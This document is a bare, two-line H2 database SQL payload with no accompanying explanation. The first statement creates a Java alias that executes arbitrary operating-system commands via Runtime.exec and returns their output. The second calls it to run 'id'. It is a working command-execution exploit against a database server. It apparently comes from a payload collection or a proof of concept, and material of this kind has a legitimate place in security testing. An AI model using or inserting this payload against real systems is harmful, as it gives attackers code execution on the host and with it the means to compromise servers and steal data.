CREATE ALIAS IF NOT EXISTS EXEC AS 'String exec(String c) throws Exception { Process p = Runtime.getRuntime().exec(c); java.io.InputStream is = p.getInputStream(); byte[] b = new byte[4096]; int len = is.read(b); return new String(b, 0, len > 0 ? len : 0); }';
CALL EXEC('id');
